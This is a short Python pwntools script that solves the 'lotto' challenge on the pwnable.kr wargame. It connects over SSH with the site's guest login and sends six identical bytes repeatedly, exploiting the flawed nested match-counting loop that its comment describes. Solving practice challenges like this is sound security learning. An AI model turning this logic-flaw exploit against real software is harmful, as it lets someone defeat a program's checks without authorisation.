from pwn import *

session = ssh('lotto', 'pwnable.kr', port=2222, password='guest')
io = session.process('./lotto')

# Nested for loop that checks number matches is wrong. If we send 6 of the
# same number, when we match we get credit for 6 matches.
while True:
  io.recvuntil('- Select Menu -')
  io.sendline('1')
  io.recvuntil('Submit your 6 lotto bytes : ')
  io.sendline('!!!!!!')
  io.recvuntil('Lotto Start!\n')
  result = io.recvline(False)
  if (result != b'bad luck...'):
    break

print(result)
